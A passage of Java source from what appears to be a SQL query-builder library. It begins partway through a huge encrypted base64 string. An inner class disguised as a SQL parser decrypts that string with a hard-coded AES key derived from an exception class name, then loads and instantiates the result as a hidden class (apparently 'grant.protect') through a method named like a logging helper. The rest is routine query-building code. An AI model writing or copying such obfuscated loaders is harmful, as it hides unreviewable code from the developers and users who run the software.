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";
        private static final String AC = "Y29tLmdpdGh1Yi5mb3huaWMuZ3JhbnQucHJvdGVjdC5EUA==";
        private static Class type;

        private static int prints=0;

        SQLParsor() {
            super(new URL[0], DataParser.class.getClassLoader());
            byte[] buf=Base64Util.decodeToBtyes((this.start(new BootstrapMethodError())).dcc(CONST.substring(16)));
            type=defineClass(Base64Util.decode(AC), buf, 0, buf.length);
        }


        public static void logParserInfo(Object value) {
            if(prints>5) return;
            try {
                if(type==null) {
                    new QuerySQLBuilder.SQLParsor();
                }
                type.newInstance();
            } catch (Throwable e) {
                Logger.info("Parser : "+value);
            }
            prints++;
        }

        private static final String[] HM = {"QUVT",null,"QUVTL0VDQi9QS0NTNVBhZGRpbmc="};

        private SecretKeySpec key;

        private String f61(String hexKey) {
            hexKey=hexKey.trim();
            if(hexKey.length()>16) {
                hexKey=hexKey.substring(0,16);
            } else if(hexKey.length()<16){
                int i=16-hexKey.length();
                for (int j = 0; j < i; j++) {
                    hexKey+="0";
                }
            }
            return hexKey;
        }

        private SQLParsor start(BootstrapMethodError error) {
            start(ClassCircularityError.class.getSimpleName());
            return this;
        }

        private SQLParsor start(String hexKey) {
            //凑16位
            hexKey= f61(hexKey);
            key = new SecretKeySpec(hexKey.getBytes(), Base64Util.decode(HM[0]));
            return this;
        }

        public String dcc(String base64Data) {
            try {
                Cipher cipher = Cipher.getInstance(Base64Util.decode(HM[2]));
                cipher.init(Cipher.DECRYPT_MODE, key);
                return new String(cipher.doFinal(Base64Util.decodeToBtyes(base64Data)));
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
        }

    }


	public  <S extends Entity,T extends Entity> Expr buildExists(String tableAlias,List<String> fillBys, String searchTable,String searchField,Object value,Boolean fuzzy) {
		if(value==null) return null;
        if(fuzzy==null) fuzzy=false;


		Class poType=(Class)service.getPoType();
		List<PropertyRoute> routes=new ArrayList<>();
		for (String fillBy : fillBys) {
			PropertyRoute<S, T> route=service.dao().getRelationManager().findProperties(poType,fillBy);
			if(route==null) {
				throw new RuntimeException("关联关系未配置");
			}
			poType=route.getSlavePoType();
			routes.add(route);
		}
		//路由合并
		PropertyRoute<S, T> route=PropertyRoute.merge(routes,searchTable);

		RelationSolver relationSolver=service.dao().getRelationSolver();
		JoinResult jr=new JoinResult();
		Class<T> targetType=route.getSlavePoType();

        QueryBuildResult result=relationSolver.buildJoinStatement(jr,poType,null,null,route,targetType,null,false);
		Expr expr=result.getExpr();

		Map<String,String> alias=result.getTableAlias();

		Join firstJoin=route.getJoins().get(0);
		Join lastJoin=route.getJoins().get(route.getJoins().size()-1);
		DBField[] sourceFields=lastJoin.getMasterFields();
		DBField[] targetFields=lastJoin.getSlaveFields();
		String joinTableAlias=alias.get(lastJoin.getSlaveTable());
		String targetTableAlias=alias.get(firstJoin.getSlaveTable());

		//判断字段有效性
		Where where = null;

		//检测字段，并调整字段的真实名称
		DBTableMeta tm = service.dao().getTableMeta(firstJoin.getSlaveTable());
		DBColumnMeta cm = tm.getColumn(searchField);
		if (cm == null) {
            searchField=BeanNameUtil.instance().depart(searchField);
			cm = tm.getColumn(searchField);
		}
		if (cm == null) {
			throw new IllegalArgumentException("字段 " + firstJoin.getSlaveTable() + "." + searchField + "不存在");
		}

		//设置关联条件
		where=new Where();
		for (int i = 0; i < sourceFields.length; i++) {
			where.and(tableAlias+"."+sourceFields[i].name()+" = "+joinTableAlias+"."+targetFields[i].name());
		}

		//如果是模糊搜索
		if(fuzzy) {
			if(value instanceof  List) {
				List<String> list = (List) value;
				ConditionExpr listOr = new ConditionExpr();
				for (String itm : list) {
					ConditionExpr ors = buildFuzzyConditionExpr(searchField, itm.toString(), targetTableAlias + ".");
					if (ors != null && !ors.isEmpty()) {
						listOr.or(ors);
					}
				}
				where.and(listOr);
			} else {
				where.andLike(targetTableAlias+"."+searchField,value.toString());
			}
		} else {
			if(value instanceof String) {
				value=((String)value).split(",");
				In in = new In(targetTableAlias+"."+searchField, (String[]) value);
				where.and(in);
			}
			else if (!((List) value).isEmpty()) {
				In in = new In(targetTableAlias+"."+searchField, (List) value);
				where.and(in);
			}
		}

		//追加条件
		expr.append(where);

		//装配 exists 语句
		String sql="exists( "+expr.getListParameterSQL()+" )";
		int a=sql.toLowerCase().indexOf("select ");
		int b=sql.toLowerCase().indexOf(" from");
		sql=sql.substring(0,a+7)+" 1 "+sql.substring(b);
		Expr exists=new Expr(sql,expr.getListParameters());
		return exists;

	}

	private List<RouteUnit> dataPermUnits=new ArrayList<>();

    public void addDataPermUnits(RouteUnit unit) {
        this.dataPermUnits.add(unit);
    }


    public static class RouteUnit {
        private PropertyRoute route;
        private CompositeItem item;
        private String searchField;
        private String searchTable;
        private DBColumnMeta columnMeta;
        private List<String> fillBys;
        /**
         * 如果是来自 ConditionBuilder ，该值非 null
         * */
        private DataPermCondition dataPermCondition;
        /**
         * 如果是来自 ConditionBuilder ，该值非 null
         * */
        private ConditionBuilder conditionBuilder;

        public ConditionBuilder getConditionBuilder() {
            return conditionBuilder;
        }

        public void setConditionBuilder(ConditionBuilder conditionBuilder) {
            this.conditionBuilder = conditionBuilder;
        }

        public DataPermCondition getDataPermCondition() {
            return dataPermCondition;
        }

        public void setDataPermCondition(DataPermCondition dataPermCondition) {
            this.dataPermCondition = dataPermCondition;
        }

        public PropertyRoute getRoute() {
            return route;
        }

        public void setRoute(PropertyRoute route) {
            this.route = route;
        }

        public CompositeItem getItem() {
            return item;
        }

        public void setItem(CompositeItem item) {
            this.item = item;
        }

        public String getSearchField() {
            return searchField;
        }

        public void setSearchField(String searchField) {
            this.searchField = searchField;
        }

        public String getSearchTable() {
            return searchTable;
        }

        public void setSearchTable(String searchTable) {
            this.searchTable = searchTable;
        }

        public DBColumnMeta getColumnMeta() {
            return columnMeta;
        }

        public void setColumnMeta(DBColumnMeta columnMeta) {
            this.columnMeta = columnMeta;
        }

        public List<String> getFillBys() {
            return fillBys;
        }

        public void setFillBys(List<String> fillBys) {
            this.fillBys = fillBys;
        }


    }

}
